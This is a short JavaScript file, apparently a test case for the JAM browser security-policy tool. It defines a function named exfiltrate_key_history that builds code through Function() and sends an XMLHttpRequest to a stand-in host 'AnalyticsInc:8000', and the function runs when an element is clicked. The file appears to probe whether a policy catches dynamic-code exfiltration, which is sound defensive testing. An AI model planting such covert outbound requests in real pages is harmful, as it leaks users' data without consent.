
JAM.startProfile('load');
introspect(JAM.policy.pFull) {
function exfiltrate_key_history() {
  var v0 = Function('xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=func_encodesel", true);xmlhttp.send(null);');
  v0();
  return;
}
var v1 = document.getElementById("test");
v1.onclick = exfiltrate_key_history

}

JAM.stopProfile('load');
